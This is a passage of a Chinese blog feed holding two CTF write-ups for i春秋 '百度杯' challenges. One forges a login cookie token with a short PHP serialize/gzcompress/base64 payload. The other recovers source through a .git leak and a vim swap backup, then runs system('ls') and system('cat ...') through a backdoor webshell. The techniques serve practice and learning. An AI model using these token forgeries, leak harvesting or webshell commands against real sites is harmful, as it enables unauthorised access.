&lt;h3 id=&quot;注册Vultr&quot;&gt;&lt;a href=&quot;#注册Vultr&quot; class=&quot;headerlink&quot; title=&quot;注册Vultr&quot;&gt;&lt;/a&gt;注册Vultr&lt;/h3&gt;&lt;p&gt;打开&lt;a
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="vps购买" scheme="http://yoursite.com/tags/vps%E8%B4%AD%E4%B9%B0/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 “百度杯”login Writeup</title>
    <link href="http://yoursite.com/2018/05/26/login/"/>
    <id>http://yoursite.com/2018/05/26/login/</id>
    <published>2018-05-26T00:11:37.000Z</published>
    <updated>2018-05-30T11:53:12.321Z</updated>
    
    <content type="html"><![CDATA[<p>首先打开来是一个登陆的页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/18428115.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>看看源码有没有什么提示：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/40754883.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到最后面注释了两个<code>test1</code></p><p>我们拿test1登陆进去试试：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/28913348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>登陆成功。<br>左右看看没有什么发现。<br>打开burpsuite抓包试试:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/18245448.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到响应包有<code>show</code>这个参数，并且等于<code>0</code><br>我们将<code>show</code>这个参数等于<code>1</code>发送试试:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/14660146.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>发送之后果然出现了一段代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/55268993.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这段代码的大概意思是：</p><pre>当$login['user']='ichunqiu'的时候，echo flag但是login只能从token中获得，并且被几个函数加密了，我们只需要照着过程逆回去即可</pre>payload：<pre>$arr = array('user'=>'ichunqiu');$hello = base64_encode(gzcompress(serialize('$arr')));echo $hello;</pre><p>直接解析之后echo的值就是我们需要的<code>token</code>值,<br>这里解密之后是这个：</p><pre>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</pre><p>将<code>token</code>放到<code>cookie</code>里发送即可得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/65528752.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先打开来是一个登陆的页面：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/18428115.jpg&quot;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>i春秋&quot;百度杯&quot; 十月份Backdoor Write up</title>
    <link href="http://yoursite.com/2018/05/26/Backdoor/"/>
    <id>http://yoursite.com/2018/05/26/Backdoor/</id>
    <published>2018-05-25T22:09:05.000Z</published>
    <updated>2018-05-30T11:52:47.018Z</updated>
    
    <content type="html"><![CDATA[<p>春秋”百度杯” 十月份Backdoor Write up</p><p>首先题目提示:</p><p><code>敏感文件泄露</code></p><p>.git泄露：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/46656696.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>使用githack将网站源码下载下来：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/46466049.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>目录下有：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/35537649.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>但是都是没有用的信息：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/23209636.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>访问：</p><pre>.git/logs/refs/heads/master</pre><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/90408336.jpg" alt="" title="" class="">                <p></p>            </figure><p>猜想是还原版本：</p><pre>git checkout 734d08</pre><p>然后再看看：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/62246852.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>果然是，多试几个之后就出来一个不一样的flag文件：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/92702762.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>访问<code>b4ckdo0r.php</code>：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/61413589.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>其他地方没给什么提示，就试试有没有<code>swp/swo</code>文件：<br>swp文件是vim编辑器不正常退出时产生的文件</p><pre>URL/.b4ckdo0r.php.swp或者URL/.b4ckdo0r.php.swo</pre>然后可以知道swp文件没有，但是`swo`文件存在下载下来之后将后缀名`swo更改为swp`在`linux`下进行还原这里附上还原方法：<pre>在linux下假设你的swp文件叫'.index.php.swp'可用带-r参数编辑#vi -r index.php然后wq保存即可或者使用:#vi  .index.php.swp然后:recover最后wq保存</pre><p>还原出来之后是:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/32813565.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>php混淆加密，给出python脚本，<a href="http://www.cnblogs.com/go2bed/p/5920811.html" target="_blank" rel="noopener">参考链接</a><br>将其中的URL换成题目的URL就行：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/43015341.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>执行：</p><pre>python 保存的脚本名字.py b4ckdo0r.php</pre>可以看到phpshell执行<pre>system('ls');</pre><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/38797290.jpg" alt="" title="" class="">                <p></p>            </figure><p>查看即可得到flag:</p><pre>system('cat this_i5_flag.php');</pre><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-26/70344916.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;春秋”百度杯” 十月份Backdoor Write up&lt;/p&gt;
&lt;p&gt;首先题目提示:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;敏感文件泄露&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;.git泄露：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img 
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term=".git泄露" scheme="http://yoursite.com/tags/git%E6%B3%84%E9%9C%B2/"/>
    
      <category term="vim文件备份" scheme="http://yoursite.com/tags/vim%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD/"/>
    
  </entry>
  
</feed>
